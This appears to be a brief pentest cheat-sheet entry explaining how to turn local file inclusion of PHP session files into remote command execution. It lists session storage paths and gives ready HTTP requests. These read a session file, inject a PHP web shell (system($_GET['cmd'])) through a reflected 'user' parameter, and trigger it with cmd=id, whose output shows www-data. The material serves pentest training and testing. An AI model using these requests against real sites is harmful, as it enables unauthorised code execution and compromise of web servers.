# PHP session

When a web server wants to handle sessions, it can use PHP session cookies (`PHPSESSID`).

1.  Finding where the sessions are stored.

    Examples:

    * Linux : `/var/lib/php5/sess_[PHPSESSID]`
    * Linux : `/var/lib/php/sessions/sess_[PHPSESSID]`
    * Windows : `C:\Windows\Temp\`
2.  Displaying a `PHPSESSID` to see if any parameter is reflected inside.

    Example:

    * The user name for the session (from a parameter called `user`)
    * The language used by the user (from a parameter called `lang`)

    _Exemple :_

```http
GET /?user=/var/lib/php/sessions/sess_[PHPSESSID] HTTP/2

username|s:6:"tester";lang|s:7:"English";
```

3\. Inject some PHP code in the reflected parameter in the session

```http
GET /?user=<%3fphp+system($_GET['cmd'])%3b+%3f> HTTP/2
```

4\. Call the `session file`with the vulnerable parameter to trigger a command exection

```http
GET /?user=/var/lib/php/sessions/sess_[PHPSESSID]&cmd=id HTTP/2

</h2> username|s:30:"uid=33(www-data) gid=33(www-data) groups=33(www-data)
";lang|s:7:"English";
```
